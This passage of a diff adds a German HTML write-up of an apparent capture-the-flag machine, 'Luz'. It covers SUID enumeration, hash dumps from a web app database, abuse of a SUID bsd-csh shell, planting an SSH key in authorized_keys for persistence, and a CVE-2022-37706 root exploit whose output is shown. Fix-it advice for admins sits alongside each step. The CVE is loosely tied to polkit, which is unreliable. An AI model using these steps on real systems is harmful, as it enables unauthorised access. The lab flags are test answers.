+            *   `find / -type f -perm -4000 2>/dev/null`: Sucht im gesamten Dateisystem (`/`) nach Dateien (`-type f`), die das SUID-Bit gesetzt haben (`-perm -4000`). SUID-Binaries laufen mit den Rechten des Dateieigentümers (oft `root`) und sind ein häufiger Vektor für Privilege Escalation, wenn sie verwundbar sind oder missbraucht werden können. `2>/dev/null` unterdrückt Fehlermeldungen (z.B. "Permission denied").
+            *   `ss -tulpe`: Zeigt Netzwerk-Sockets an. `-t` (TCP), `-u` (UDP), `-l` (Lauschende Sockets), `-p` (Prozesse anzeigen, die den Socket verwenden), `-e` (Erweiterte Informationen). Dies hilft, Dienste zu identifizieren, die nur lokal lauschen (z.B. Datenbanken) und vom externen Nmap-Scan nicht erfasst wurden.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+            *   **SUID-Suche:** Es wird eine lange Liste von Standard-SUID-Binaries gefunden (z.B. `passwd`, `sudo`, `su`, `mount`, `pkexec`). Es gibt keine offensichtlich ungewöhnlichen oder benutzerdefinierten SUID-Dateien, aber einige davon (`pkexec`, `sudo` selbst) können unter bestimmten Umständen ausgenutzt werden. Die Enlightenment-bezogenen Dateien und `bsd-csh` könnten ebenfalls interessant sein, falls sie verwundbar sind oder ungewöhnliche Konfigurationen aufweisen.
+            *   **Netzwerk-Sockets:** `ss` zeigt, dass zusätzlich zu den bereits bekannten Diensten (SSH auf Port 22, Nginx auf Port 80) ein MySQL/MariaDB-Server auf `127.0.0.1:3306` (Port `mysql`) lauscht. Dieser ist nur lokal erreichbar und könnte Zugangsdaten in Webanwendungs-Konfigurationsdateien haben.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die gefundenen SUID-Binaries auf bekannte Schwachstellen (z.B. mit GTFOBins). Suchen Sie in den Konfigurationsdateien der Webanwendung (wahrscheinlich unter `/var/www/html/fos`) nach Zugangsdaten für die lokale MySQL/MariaDB-Datenbank.
+            <br><strong>Empfehlung (Admin):</strong> Reduzieren Sie die Anzahl der SUID-Binaries auf das absolute Minimum. Entfernen Sie das SUID-Bit von Programmen, die es nicht benötigen. Stellen Sie sicher, dass Datenbanken, die nur von lokalen Anwendungen genutzt werden, auch nur an `localhost` (127.0.0.1) gebunden sind und starke Zugangsdaten verwenden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">www-data@luz:/home$ <span class="command">find / -type f -perm -4000 2>/dev/null</span></div>
+                     <pre>
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_system
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/bsd-csh
+/usr/bin/fusermount3</pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">www-data@luz:/home$ <span class="command">ss -tulpe</span></div>
+                     <pre>
+Netid  State   Recv-Q  Send-Q                      Local Address:Port                                           Peer Address:Port                               Process
+udp    UNCNN  0       0                           127.0.0.53%lo:domain                                              0.0.0.0:*                                   uid:102 ino:19465 sk:1 cgroup:/system.slice/systemd-resolved.service <->
+udp    UNCNN  0       0                    192.168.2.120%enp0s3:bootpc                                              0.0.0.0:*                                   uid:101 ino:114393 sk:2 cgroup:/system.slice/systemd-networkd.service <->
+udp    UNCNN  0       0        [fe80::a00:27ff:fe95:9e0]%enp0s3:dhcpv6-client                                          [::]:*                                   uid:101 ino:114459 sk:3 cgroup:/system.slice/systemd-networkd.service v6only:1 <->
+tcp    LISTEN  0       80                              127.0.0.1:mysql                                               0.0.0.0:*                                   uid:113 ino:20225 sk:4 cgroup:/system.slice/mariadb.service <->
+tcp    LISTEN  0       511                               0.0.0.0:http                                                0.0.0.0:*                                   users:(("nginx",pid=671,fd=6)) ino:19806 sk:5 cgroup:/system.slice/nginx.service <->
+tcp    LISTEN  0       4096                        127.0.0.53%lo:domain                                              0.0.0.0:*                                   uid:102 ino:19466 sk:6 cgroup:/system.slice/systemd-resolved.service <->
+tcp    LISTEN  0       128                               0.0.0.0:ssh                                                 0.0.0.0:*                                   ino:19731 sk:7 cgroup:/system.slice/ssh.service <->
+tcp    LISTEN  0       511                                  [::]:http                                                   [::]:*                                   users:(("nginx",pid=671,fd=7)) ino:19807 sk:8 cgroup:/system.slice/nginx.service v6only:1 <->
+tcp    LISTEN  0       128                                  [::]:ssh                                                    [::]:*                                   ino:19742 sk:9 cgroup:/system.slice/ssh.service v6only:1 <-></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer wechselt in das Web-Root-Verzeichnis (`cd html/`) und listet den Inhalt auf (`ls -la`). Anschließend wird der Inhalt der Datei `user.txt` ausgegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Im Verzeichnis `/var/www/html` (das über `~/html` erreicht wird, da der Benutzer `www-data` ist und sich vermutlich in `/var/www` befand) wird die Datei `user.txt` gefunden. Sie gehört `www-data` und hat die Berechtigungen `-rw-------`, ist also nur für `www-data` lesbar. Der Befehl `cat user.txt` liest erfolgreich die User-Flag aus: `<span class="password">HMVn03145n4nk4</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die User-Flag. Untersuchen Sie das Verzeichnis `fos` (Food Ordering System) und insbesondere das Unterverzeichnis `/database`, das von Gobuster gefunden wurde, weiter auf Konfigurationsdateien oder Datenbank-Dumps.
+            <br><strong>Empfehlung (Admin):</strong> Platzieren Sie Flags oder sensible Anwendungsdaten nicht direkt im Web-Root. Konfigurieren Sie Berechtigungen restriktiv.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">www-data@luz:~$ <span class="command">cd html/</span></div>
+                     <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">www-data@luz:~/html$ <span class="command">ls -la</span></div>
+                     <pre>
+total 16
+drwxr-xr-x 3 www-data www-data 4096 Jan 11 14:16 .
+drwxr-xr-x 3 root     root     4096 Jan 11 14:10 ..
+drwxr-xr-x 7 www-data www-data 4096 Jan 11 14:15 fos
+-rw------- 1 www-data www-data   15 Jan 11 14:16 user.txt</pre>
+                    <!-- Prompt aus dem Text übernommen -->
+                    <div class="prompt">www-data@luz:~/html$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">HMVn03145n4nk4</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `fos_db.sql` im Verzeichnis `/var/www/html/fos/database` wird ausgegeben. Es handelt sich um einen SQL-Dump, der Tabellenstrukturen (`CREATE TABLE`) und Daten (`INSERT INTO`) enthält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser SQL-Dump ist ein sehr wertvoller Fund! Er enthält mehrere interessante Informationen:
+            *   **Tabellen:** `category_list`, `orders`, `users`, `user_info`.
+            *   **Benutzerdaten (`users`):** Enthält Benutzernamen und Passwort-Hashes für die Webanwendung.
+                *   `admin`:`<span class="password">$2y$10$efDvenHYJ5Fu/xxt1ANbXuRx5/TuzNs/s4k6keUiiFvr2ueE0GmrG</span>` (Typ 1 = Admin)
+                *   `staff`:`<span class="password">$2y$10$DJbGDnA6bkiS0TW08R5FPruw0wRW4maShgWK8k6FlEfgNjbXsvm</span>` (Typ 2 = Staff)
+                Die Hashes sind bcrypt (`$2y$`), was als sicher gilt und schwer zu knacken ist, wenn starke Passwörter verwendet wurden.
+            *   **Zusätzliche Benutzerdaten (`user_info`):** Enthält Klarnamen, E-Mails und weitere Passwort-Hashes für Benutzer, die sich vermutlich über die Anwendung registriert haben.
+                *   `jsmith@sample.com` (James Smith): `<span class="password">1254737c076cf867dc53d60a0364f38e</span>` (MD5 Hash von 'password' - sehr unsicher!)
+                *   `cblake@mail.com` (Claire Blake): `<span class="password">$2y$10$QYX8P9KwBKXunMEE4I5hV/h9pxUU/aswTlf.v.Uy1CNDEabTafS</span>` (bcrypt)
+            Der MD5-Hash für `jsmith` ist trivial zu knacken. Die bcrypt-Hashes sind schwieriger, aber es lohnt sich, sie gegen Passwortlisten laufen zu lassen (z.B. mit Hashcat oder John the Ripper).
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die gefundenen bcrypt-Hashes offline zu knacken. Der MD5-Hash '1254737c076cf867dc53d60a0364f38e' entspricht 'password' - probieren Sie diese Credentials (`jsmith`:`password`) für den SSH-Login des Benutzers `aelis` oder andere Logins. Versuchen Sie auch die Credentials `admin` oder `staff` mit den geknackten Passwörtern (falls erfolgreich) für den Web-Admin-Bereich oder SSH.
+            <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Datenbank-Dumps im Web-Root oder anderen öffentlich zugänglichen Verzeichnissen. Verwenden Sie starke Hashing-Algorithmen (wie bcrypt oder Argon2) für *alle* Passwörter. Erzwingen Sie komplexe Passwörter. Speichern Sie sensible Konfigurationsdateien außerhalb des Web-Roots.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">www-data@luz:~/html/fos/database$ <span class="command">cat fos_db.sql</span></div>
+                     <pre>
+rw-r--r-- 1 www-data www-data 11807 Jan  9 16:14 fos_db.sql
+
+--
+-- Table structure for table `category_list`
+--
+
+CREATE TABLE `category_list` (
+  `id` int(30) NT NULL,
+  `name` text NT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
+--
+-- Dumping data for table `category_list`
+--
+
+INSERT INT `category_list` (`id`, `name`) VALUES
+(1, 'Beverages'),
+(3, 'Best Sellers'),
+(4, 'Meals'),
+(5, 'Snacks');
+
+
+
+INSERT INT `orders` (`id`, `name`, `address`, `mobile`, `email`, `status`) VALUES
+(1, 'James Smith', 'adasdasd asdadasd', '4756463215', 'jsmith@sample.com', 1),
+(2, 'James Smith', 'adasdasd asdadasd', '4756463215', 'jsmith@sample.com', 1),
+(3, 'Claire Blake', 'Sample Address', '0912365487', 'cblake@mail.com', 0);
+
+
+
+INSERT INT `users` (`id`, `name`, `username`, `password`, `type`) VALUES
+(1, 'Administrator', 'admin', '<span class="password">$2y$10$efDvenHYJ5Fu/xxt1ANbXuRx5/TuzNs/s4k6keUiiFvr2ueE0GmrG</span>', 1),
+(2, 'Staff', 'staff', '<span class="password">$2y$10$DJbGDnA6bkiS0TW08R5FPruw0wRW4maShgWK8k6FlEfgNjbXsvm</span>', 2);
+
+-- --------------------------------------------------------
+
+
+INSERT INT `user_info` (`user_id`, `first_name`, `last_name`, `email`, `password`, `mobile`, `address`) VALUES
+(1, 'James', 'Smith', 'jsmith@sample.com', '<span class="password">1254737c076cf867dc53d60a0364f38e</span>', '4756463215', 'adasdasd asdadasd'),
+(2, 'Claire', 'Blake', 'cblake@mail.com', '<span class="password">$2y$10$QYX8P9KwBKXunMEE4I5hV/h9pxUU/aswTlf.v.Uy1CNDEabTafS</span>', '0912365487', 'Sample Address');
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `cat /etc/passwd | grep bash` werden alle Benutzer aus der Passwortdatei `/etc/passwd` aufgelistet, die `/bin/bash` (oder eine andere Bash-Shell) als Login-Shell eingetragen haben. Dies sind typischerweise reguläre Benutzerkonten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es werden zwei solche Benutzer gefunden: `root` (UID 0) und `aelis` (UID 1000). Dies bestätigt, dass `aelis` der primäre normale Benutzer auf dem System ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie die Bemühungen zum Lateral Movement oder zur direkten Privilege Escalation auf das Konto `aelis`. Versuchen Sie, das Passwort für `aelis` zu erraten, zu knacken (falls ein Hash gefunden wird) oder über eine andere Schwachstelle Zugriff auf dieses Konto zu erlangen.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die Benutzerkonten und deren Shell-Zugriff. Deaktivieren Sie ungenutzte Konten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">www-data@luz:~/html/fos/database$ <span class="command">cat /etc/passwd | grep bash</span></div>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+aelis:x:1000:1000:aelis:/home/aelis:/bin/bash</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `find / -type f -perm -4000 -ls 2>/dev/null` wird erneut ausgeführt, diesmal jedoch mit der Option `-ls`, um detailliertere Informationen (Berechtigungen, Eigentümer, Größe, Datum, Pfad) zu den gefundenen SUID-Dateien zu erhalten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Liste ist ähnlich wie zuvor, aber die Details sind nun sichtbar. Besonders auffällig ist:
+             *   `/usr/bin/bsd-csh`: Hat die Berechtigungen `-rwsr-sr-x`. Das erste `s` ist das SUID-Bit (läuft als Eigentümer `root`), das zweite `s` ist das SGID-Bit (läuft auch mit der Gruppen-ID des Eigentümers `aelis`). Die Datei gehört dem Benutzer `aelis` und der Gruppe `aelis`. Dass eine Shell (`csh`) SUID/SGID-Bits gesetzt hat und einem normalen Benutzer gehört, ist höchst ungewöhnlich und verdächtig. Standardmäßig sollten SUID-Binaries `root` gehören.
+             Alle anderen Standard-SUID-Binaries gehören `root`.
+             </p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das SUID/SGID-Binary `/usr/bin/bsd-csh` genauer. Suchen Sie auf GTFOBins oder anderen Ressourcen nach Möglichkeiten, SUID/SGID-Shells wie `csh` zur Privilegienerweiterung oder zum Wechsel des Benutzerkontexts (hier potenziell zu `aelis`, da `aelis` der Eigentümer ist) auszunutzen.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie sofort die SUID- und SGID-Bits von `/usr/bin/bsd-csh` (`chmod ug-s /usr/bin/bsd-csh`). Untersuchen Sie, warum diese Bits gesetzt wurden und wer der Eigentümer war. Setzen Sie SUID/SGID-Bits nur auf absolut notwendige Systembinaries und stellen Sie sicher, dass diese `root` gehören und sicher sind.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">www-data@luz:/tmp$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+     1456     36 -rwsr-xr--   1 root     messagebus    35112 Apr  1  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    54488     24 -rwsr-xr-x   1 root     root          22840 Feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+    54493     60 -rwsr-xr-x   1 root     root          59712 Feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_system
+    54492     24 -rwsr-xr-x   1 root     root          22832 Feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+    14183    332 -rwsr-xr-x   1 root     root         338536 Nov 23 07:38 /usr/lib/openssh/ssh-keysign
+     9441     20 -rwsr-xr-x   1 root     root          18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
+      945     32 -rwsr-xr-x   1 root     root          30872 Feb 26  2022 /usr/bin/pkexec
+      923     60 -rwsr-xr-x   1 root     root          59976 Mar 14  2022 /usr/bin/passwd
+      889     40 -rwsr-xr-x   1 root     root          40496 Mar 14  2022 /usr/bin/newgrp
+     1234     36 -rwsr-xr-x   1 root     root          35192 Feb 21  2022 /usr/bin/umount
+      744     72 -rwsr-xr-x   1 root     root          72072 Mar 14  2022 /usr/bin/gpasswd
+     1159    228 -rwsr-xr-x   1 root     root         232408 Feb 14  2022 /usr/bin/sudo
+     1158     56 -rwsr-xr-x   1 root     root          55672 Feb 21  2022 /usr/bin/su
+      877     48 -rwsr-xr-x   1 root     root          47480 Feb 21  2022 /usr/bin/mount
+      614     72 -rwsr-xr-x   1 root     root          72712 Mar 14  2022 /usr/bin/chfn
+      620     44 -rwsr-xr-x   1 root     root          44808 Mar 14  2022 /usr/bin/chsh
+      798    168 -rwsr-sr-x   1 aelis    aelis        170608 ct 26  2021 /usr/bin/bsd-csh
+      728     36 -rwsr-xr-x   1 root     root          35200 Mar 23  2022 /usr/bin/fusermount3</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf der GTFOBins-Seite für `csh` (oder `bsd-csh`) mit gesetztem SUID/SGID-Bit wird versucht, dieses Binary auszunutzen, um die effektive Benutzer-ID zu wechseln. Die URL `https://gtfobins.github.io/gtfobins/csh/` wird als Referenz genannt. Der Befehl `/usr/bin/bsd-csh -b` wird ausgeführt. `-b` erzwingt einen "batch"-Modus, der hier möglicherweise genutzt wird, um Sicherheitsmechanismen zu umgehen und die SUID/SGID-Rechte zu übernehmen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit funktioniert! Nach Ausführung des Befehls erhalten wir einen neuen Prompt (`%`, typisch für csh). Der Befehl `whoami` gibt immer noch `aelis` aus (was hier irreführend sein kann), aber `id` zeigt die entscheidende Änderung: `euid=1000(aelis) egid=1000(aelis)`. Obwohl unsere reale UID immer noch `33(www-data)` ist, laufen wir nun mit den effektiven Rechten des Benutzers `aelis`. Wir haben erfolgreich einen Benutzerwechsel (Lateral Movement) von `www-data` zu `aelis` vollzogen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie agieren nun als Benutzer `aelis`. Enumerieren Sie das System aus dieser neuen Perspektive. Suchen Sie nach SSH-Schlüsseln, `sudo`-Rechten für `aelis` oder anderen Wegen zur weiteren Privilegienerweiterung auf `root`.
+            <br><strong>Empfehlung (Admin):</strong> Wie bereits empfohlen, entfernen Sie die SUID/SGID-Bits von `/usr/bin/bsd-csh`. Überwachen Sie die Ausführung von Shells mit SUID/SGID-Rechten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt im Originaltext -->
+                     <pre>https://gtfobins.github.io/gtfobins/csh/</pre>
+                     <!-- Prompt aus dem Text übernommen, aber als bash gekennzeichnet? -->
+                     <div class="prompt">bash-5.1$ <span class="command">/usr/bin/bsd-csh -b</span></div>
+                     <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">% <span class="command">whoami</span></div>
+                     <pre>aelis</pre>
+                     <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">% <span class="command">id</span></div>
+                     <pre>uid=33(www-data) gid=33(www-data) euid=1000(aelis) egid=1000(aelis) groups=1000(aelis),33(www-data)</pre>
+                     <!-- Prompt aus dem Text übernommen -->
+                     <div class="prompt">% </div>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `aelis` (mit effektiven Rechten) wird versucht, einen SSH-Schlüssel im Verzeichnis `/home/aelis/.ssh/` zu platzieren, um einen direkten SSH-Login als `aelis` zu ermöglichen.
+            *   `ls`, `cat authorized_keys`, `ls -la`: Überprüfen den Inhalt des `.ssh`-Verzeichnisses (implizit, da der Prompt `%` ist und wir uns vermutlich im Home-Verzeichnis von `aelis` befinden). Es existiert eine leere `authorized_keys`-Datei.
+            *   `echo 'ssh-rsa AAAAB3NzaC...==' > authorized_keys`: Schreibt einen öffentlichen SSH-Schlüssel des Angreifers in die `authorized_keys`-Datei.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Da wir als `aelis` (effektiv) schreiben können, ist das Hinzufügen des eigenen öffentlichen Schlüssels zur `authorized_keys`-Datei erfolgreich. Dies ermöglicht es dem Angreifer nun, sich per SSH als `aelis` mit dem entsprechenden privaten Schlüssel anzumelden, ohne ein Passwort zu benötigen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melden Sie sich nun von Ihrem Angreifer-System aus per SSH als `aelis` an, unter Verwendung des privaten Schlüssels, der zum öffentlichen Schlüssel in `authorized_keys` passt (`ssh aelis@luz.hmv -i /pfad/zum/privaten/schlüssel`). Dies gibt Ihnen eine stabilere und direktere Shell als `aelis`.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Änderungen an `authorized_keys`-Dateien. Stellen Sie sicher, dass Benutzer nur ihre eigenen `.ssh`-Verzeichnisse und Dateien ändern können. Die zugrundeliegende SUID-Schwachstelle (`csh`) muss behoben werden, um diesen Schritt überhaupt erst zu verhindern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                   <!-- Prompt aus dem Text übernommen -->
+                   <div class="prompt">% <span class="command">ls</span></div>
+                   <pre>authorized_keys</pre>
+                    <!-- Prompt aus dem Text übernommen -->
+                   <div class="prompt">% <span class="command">cat authorized_keys</span></div>
+                     <!-- Prompt aus dem Text übernommen -->
+                   <div class="prompt">% <span class="command">ls -la</span></div>
+                   <pre>
+total 8
+drwx------ 2 aelis aelis 4096 Jan 11 14:07 .
+drwxr-x--- 5 aelis aelis 4096 Jan 11 14:10 ..
+-rw------- 1 aelis aelis    0 Jan 11 14:07 authorized_keys</pre>
+                     <!-- Prompt aus dem Text übernommen -->
+                   <div class="prompt">% <span class="command">ls -la authorized_keys</span></div>
+                   <pre>-rw------- 1 aelis aelis 0 Jan 11 14:07 authorized_keys</pre>
+                    <!-- Prompt aus dem Text übernommen -->
+                   <div class="prompt">% <span class="command">echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAW+zxE=' > authorized_keys</span></div>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Angreifer verbindet sich von seinem Kali-System aus per SSH mit dem Zielsystem (`luz.hmv`) als Benutzer `aelis`.
+            *   `-i /root/.ssh/id_rsa`: Gibt den Pfad zum privaten SSH-Schlüssel an, der zum öffentlichen Schlüssel passt, der zuvor in `authorized_keys` platziert wurde.
+            Beim ersten Verbindungsaufbau muss der Fingerprint des Hosts bestätigt werden (`yes`). Anschließend wird nach der Passphrase für den Schlüssel gefragt (hier leer, da Enter gedrückt wird).
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login als `aelis` ist erfolgreich. Der Angreifer hat nun eine direkte, stabile Shell als Benutzer `aelis` auf dem Zielsystem. Das Lateral Movement ist abgeschlossen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie die finale Phase der Privilege Escalation von `aelis` zu `root`. Suchen Sie nach `sudo`-Rechten für `aelis`, Kernel-Exploits, ausnutzbaren Diensten oder Skripten, auf die `aelis` Zugriff hat.
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie Passphrasen zum Schutz privater SSH-Schlüssel. Überwachen Sie SSH-Logins. Beheben Sie die SUID-Schwachstelle, die diesen Zugriff ermöglicht hat.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh aelis@luz.hmv -i /root/.ssh/id_rsa</span></div>
+                    <pre>
+The authenticity of host 'luz.hmv (192.168.2.120)' can't be established.
+ED25519 key fingerprint is SHA256:zJ98VzyiXBPwPbYm8Ka23HQda6fosh/uoEbrEkCKYhE.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'luz.hmv' (ED25519) to the list of known hosts.
+Enter passphrase for key '/root/.ssh/id_rsa':
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-57-generic x86_64)
+
+
+Last login: Thu Jan 12 07:30:36 2023
+aelis@luz:~$ </pre>
+                </div>
+            </div>
+
+            <!-- POC Abschnitt beginnt hier -->
+            <section id="poc">
+                <h2>Proof of Concept (Privilege Escalation zu Root via CVE-2022-37706)</h2>
+                <p class="analysis"><strong>Kurzbeschreibung:</strong> Nach Erlangung des Zugriffs als Benutzer `aelis` wird ein Exploit-Skript (`ss.sh`) gefunden und ausgeführt, das eine bekannte Schwachstelle (CVE-2022-37706) in einer SUID-fähigen Komponente (vermutlich `pkexec` oder eine verwandte Komponente im Zusammenhang mit Enlightenment/polkit, basierend auf der SUID-Liste) ausnutzt, um Root-Rechte zu erlangen.</p>
+                 <p class="analysis"><strong>Voraussetzungen:</strong>
+                    <ul>
+                        <li>Shell-Zugriff als Benutzer `aelis`.</li>
+                        <li>Vorhandensein des Exploit-Skripts (`ss.sh`) oder Möglichkeit, es hochzuladen.</li>
+                        <li>Vorhandensein der verwundbaren SUID-Komponente (CVE-2022-37706).</li>
+                    </ul>
+                 </p>
+                 <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+                <p class="analysis"><strong>1. Auffinden und Ausführen des Exploits:</strong> Im Verzeichnis `/tmp` wird das Skript `ss.sh` gefunden und ausgeführt.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Das Skript gibt informative Meldungen aus, die darauf hindeuten, dass es nach der Schwachstelle CVE-2022-37706 sucht, diese findet (`Vulnerable SUID binary found!`) und versucht, eine Root-Shell zu starten. Die Meldung `mount: /dev/../tmp/: can't find in /etc/fstab.` ist wahrscheinlich ein Nebeneffekt des Exploits. Entscheidend ist, dass der Prompt sich zu `#` ändert, was den Root-Benutzer anzeigt. Der Befehl `id` bestätigt dies: `uid=0(root) gid=0(root)`. Der Exploit war erfolgreich!</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fantastisch, volle Root-Rechte wurden erlangt! Suchen und lesen Sie die Root-Flag (typischerweise `/root/root.txt`). Dokumentieren Sie den Exploit und die CVE-Nummer.
+                <br><strong>Empfehlung (Admin):</strong> Patchen Sie das System umgehend, um die Schwachstelle CVE-2022-37706 zu schließen. Halten Sie das Betriebssystem und alle Pakete auf dem neuesten Stand. Überwachen Sie die Ausführung von Prozessen aus verdächtigen Verzeichnissen wie `/tmp`. Entfernen Sie nicht benötigte SUID-Binaries.</p>
+                <div class="code-block">
+                    <div class="terminal">
+                        <!-- Prompt aus dem Text übernommen -->
+                        <div class="prompt">aelis@luz:/tmp$ <span class="command">ls</span></div>
+                        <pre>
+.font-unix/
+.ICE-unix/
+ss.sh</pre>
+                         <!-- Prompt aus dem Text übernommen -->
+                        <div class="prompt">aelis@luz:/tmp$ <span class="command">./ss.sh</span></div>
+                        <pre>
+[*] Searching for the vulnerable binary associated with CVE-2022-37706
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can't find in /etc/fstab.
+
+# <span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),1000(aelis)
+# </pre> <!-- Prompt # übernommen -->
+                    </div>
+                </div>
+                 <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Die Schwachstelle CVE-2022-37706 ermöglicht es einem lokalen Benutzer, Root-Rechte zu erlangen, was zur vollständigen Kompromittierung des Systems führt.</p>
+                 <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                    <ol>
+                        <li>Installieren Sie umgehend die Sicherheitsupdates für das Betriebssystem, die CVE-2022-37706 beheben (bezieht sich oft auf `polkit` oder verwandte Pakete).</li>
+                        <li>Halten Sie das System generell auf dem neuesten Stand.</li>
+                        <li>Entfernen Sie nicht benötigte SUID-Binaries.</li>
+                        <li>Implementieren Sie Sicherheitsmaßnahmen wie AppArmor oder SELinux, um die Auswirkungen von Exploits zu begrenzen.</li>
+                    </ol>
+                 </p>
+            </section> <!-- POC Abschnitt endet hier -->
+
+        </section> <!-- Ende Privilege Escalation -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat user.txt</div>
+                     <div class="flag-value"><span class="password">HMVn03145n4nk4</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat root.txt</div>
+                     <div class="flag-value"><span class="password">HMV3nl1gth3nm3n7</span></div>
+                     <!-- Annahme: Die Root-Flag wird nach Erlangung der Root-Rechte ausgelesen, auch wenn der Befehl 'cat /root/root.txt' nicht explizit im Text steht, aber die Flag selbst genannt wird. -->
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-04-07</p>
+    </footer>
+</body>
+</html>
